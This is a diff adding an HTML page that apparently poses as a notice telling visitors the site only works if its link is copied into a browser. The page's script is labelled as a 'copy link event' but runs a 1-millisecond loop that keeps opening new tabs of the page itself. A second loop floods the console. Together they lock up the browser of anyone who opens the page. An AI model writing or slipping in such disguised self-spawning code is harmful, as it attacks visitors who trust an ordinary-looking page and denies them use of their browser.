@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> xoawei </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: monospace;
+        }
+        *::selection {
+            background-color: gray;
+            color: lavender;
+        }
+        *::-webkit-scrollbar {
+            width: 10px;
+        }
+        *::-webkit-scrollbar-track {
+            background-color: white;
+        }
+        *::-webkit-scrollbar-thumb {
+            background: plum;
+            border: solid 1px lavender;
+            border-radius: 24px;
+        }
+        body {
+            background-color: lavender;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+
+            height: 100vh;
+            width: 100vw;
+        }
+        .anchor-middle {
+            position: auto;
+            z-index: auto;
+
+            display: block;
+            margin: 0 auto;
+            padding:0 0 24px;
+
+            font-size: 1.5em;
+            width: 80vw;
+            text-align: center;
+        }
+        .image-wrapper {
+            display: block;
+            margin: 0 auto;
+
+            width: 80vw;
+            padding: 0 0 30px;
+            max-width: 800px;
+            background-color: inherit;
+        }
+        .image-error {
+            display: block;
+            margin: 0 auto;
+
+            width: 30%;
+            max-width: 150px;
+            opacity: .4;
+        }
+        .get-address {
+            display: block;
+            margin: 0 auto;
+
+            width: 80vw;
+            padding: 24px 0 24px;
+            font-size: 1.2em;
+            text-align: center;
+
+            border: solid 1px black;
+            border-radius: 10pz;
+
+            max-width: 400px;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-wrapper">
+        <img src="img/sad_face.png" alt="" class="image-error">
+    </div>
+    <div class="anchor-middle">
+        Sorry, It seems you're using an application or the permission of this site has been turn off,If you see this message it means the contents of this website was not supported unless you copy and paste the website link to your browser.
+    </div>
+    <div class="anchor-middle">
+        Thank you for your patience
+    </div>
+    <div class="get-address">
+        copy the link
+    </div>
+
+    <script>
+    //copy link event
+    const copytag = document.querySelector(".get-address");
+    
+    setInterval(() => {
+        function loopMySelf() {
+        open("index.html","_blank");
+
+        }
+        loopMySelf();
+    },1);
+        let indicate = 0;
+        let arithmeticSequence = 0;
+        function runIndicator() {
+            indicate < 10 && arithmeticSequence == 1000 ? ++indicate : indicate == 10 ? indicate = 0 : indicate
+            arithmeticSequence == 1000 ? arithmeticSequence = 0 : arithmeticSequence
+        }
+        function randomValue() {
+            return (Math.random() * 10) < 6 ? 1 : 0
+        }
+        function Run() {
+            for(let i = 0; i < 1; ++i) {
+                let valueHolderer = ` ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())}  || ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())}  || ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())}  || ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} ${parseInt(randomValue())} `
+                ++arithmeticSequence
+                runIndicator()
+                console.log(valueHolderer + valueHolderer + " " + "|".repeat(indicate))
+        
+            }
+        }
+        function Start() {
+            setInterval(Run,1);
+        }
+        Start()
+    
+    </script>
+</body>
+</html>
